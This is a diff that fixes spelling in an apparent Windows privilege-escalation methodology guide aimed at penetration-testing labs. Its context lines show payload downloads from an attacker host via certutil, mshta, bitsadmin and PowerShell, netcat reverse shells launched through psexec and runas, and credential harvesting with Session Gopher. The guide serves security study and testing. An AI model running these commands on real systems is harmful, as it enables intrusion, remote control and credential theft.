@@ -1,5 +1,5 @@
 # Windows-Privilege-Escalation
-Here is my step-by-step windows privlege escalation methodology. This guide assumes you are starting with a very limited shell like a webshell, netcat reverse shell or a remote telnet connection. 
+Here is my step-by-step windows privilege escalation methodology. This guide assumes you are starting with a very limited shell like a webshell, netcat reverse shell or a remote telnet connection. 
 
 ## First things first and quick wins
 Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.
@@ -58,7 +58,7 @@ root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21
 ```
 
 ### Uploading Files with VBScript  
-In my experiance, VBScript is one of the easiest methods of transfering files to a remote Windows. The only downside is that the file size you can transfer is rather limited.  I often have trouble transfering anything over 1 MB using this method and have to fall back on other methods (Windows-privesc-check2.exe is much too large to transfer using this method).  
+In my experiance, VBScript is one of the easiest methods of transferring files to a remote Windows. The only downside is that the file size you can transfer is rather limited.  I often have trouble transferring anything over 1 MB using this method and have to fall back on other methods (Windows-privesc-check2.exe is much too large to transfer using this method).  
 First lets test to see if we can run VBScript  
 ```
 echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs
@@ -105,7 +105,7 @@ I've found that CertUtil can be quite reliable when all else seems to fail.
 certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
 ```
 
-### Transfering Files using MSHTA
+### Transferring Files using MSHTA
 Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). And it can also be used to transfer files :D  
 HTML:  
 ```
@@ -117,7 +117,7 @@ FTP:
 C:\>mshta ftp://10.10.10.10:21/badthings.exe
 ```
 
-### Trasfering Files using Bitsadmin
+### Transferring Files using Bitsadmin
 Background Intelligent Transfer Service (BITS) is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress. For full, comprehensive documentation of the tool and all of its commands, see bitsadmin and bitsadmin examples in the Windows IT Pro Center.
 ```
 C:\>bitsadmin /transfer badthings http://10.10.10.10:80/badthings.exe c:\users\public\payload.exe
@@ -191,8 +191,8 @@ If you are seeing a 421 timeout when you try to send a command it is likely beca
 
 You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.
 
-### Transfering Files via SMB using Impacket
-Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome.  You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease.  
+### Transferring Files via SMB using Impacket
+Kali comes loaded with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome.  You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease.  
 https://github.com/SecureAuthCorp/impacket  
 
 First we will setup the SMB Share on Kali like so:
@@ -284,12 +284,12 @@ CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfi
 ```
 
 ### Netcat Reverseshell Oneliners for Windows
-Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell.
+Sometimes it is helpful to create a new Netcat session from an existing limited shell, webshell or unstable (short lived) remote shell.
 
 
 
 # Windows Enumeration
-*NOTE* There are many executables that could provide privledge escalation if they are being run by a privledged user, most can be found on the incredible LOLBAS project:
+*NOTE* There are many executables that could provide privilege escalation if they are being run by a privileged user, most can be found on the incredible LOLBAS project:
 https://lolbas-project.github.io/
 
 ## Automated Windows Enumeration Scripts
@@ -301,7 +301,7 @@ We are also going to look a a few automated methods of performing Windows Enumer
 * Seatbelt
 
 ### Running Windows Privesc Check (windows-privesc-check)
-The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privledge escalation.  It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in.  Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!!
+The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privilege escalation.  It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in.  Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!!
 
 First we will need to clone the latest version to our environment:
 ```bash
@@ -322,7 +322,7 @@ Now we will need to transfer the file to our remote windows box:
 ```
 CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");
 ```
-And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
+And now we run the executable on the remote machine. I like run with all the audit enabled like so:
 ```
 C:\Users\Admin>cd ..
 C:\Users>cd Public
@@ -335,7 +335,7 @@ The windows-privesc-check will create a detailed HTML report and text based repo
 
 
 ### Running Sherlock
-Sherlock is a powershell library with a number of privledge escalation checkers built in. 
+Sherlock is a powershell library with a number of privilege escalation checkers built in. 
 We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.  
 ```bash
 root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
@@ -388,7 +388,7 @@ Now we will need to transfer the compiled Watson.exe file to our remote windows 
 ```
 CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/Watson.exe\", \"C:\\Users\\Public\\Downloads\\Watson.exe\");
 ```
-And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
+And now we run the executable on the remote machine. I like run with all the audit enabled like so:
 ```
 C:\Users\Admin>cd ..
 C:\Users>cd Public
@@ -397,7 +397,7 @@ C:\Users\Public\Downloads>Watson.exe
 ```
 
 ### Running JAWS - Just Another Windows (Enum) Script
-JAWS is another powershell library that was built with privledge escalation of the OSCP lab machines in mind. 
+JAWS is another powershell library that was built with privilege escalation of the OSCP lab machines in mind. 
 We can stage and run JAWS on a remote http server so the file never needs to hit the remote server's HDD.  
 ```bash
 root@kali:~test# git clone https://github.com/411Hall/JAWS
@@ -419,7 +419,7 @@ Running J.A.W.S. Enumeration
 ```
 
 ### Fireeye Session Gopher
-Leveraging credentials is still the most common ways of privledge escalation in Windows environments. Session Gopher is a PowerShell script designed to automaticlly harvest credentials from commonly used applications.
+Leveraging credentials is still the most common way of privilege escalation in Windows environments. Session Gopher is a PowerShell script designed to automatically harvest credentials from commonly used applications.
 
 To run Session Gopher, we will first need to pull down the latest version from the Fireeye github repository:
 ```
@@ -575,7 +575,7 @@ CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfi
 
 Switching users in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.
 
-Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
+Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have their username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
 
 ```cmd
  C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
@@ -584,7 +584,7 @@ Sysinternals psexec is a handy tool for running a command on a remote or local s
  Sysinternals - www.sysinternals.com
  ```
  
-Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
+Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know their password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
 ```cmd
  C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
  Enter the password for Test:
@@ -613,7 +613,7 @@ Windows file transfer script that can be pasted to the command line. File transf
 
 **CopyAndPasteEnum.bat**
 
-No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial).
+No File Upload Required Windows Privilege Escalation Basic Information Gathering (based on the fuzzy security tutorial).
 Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report
 
 **enumeration.md** 
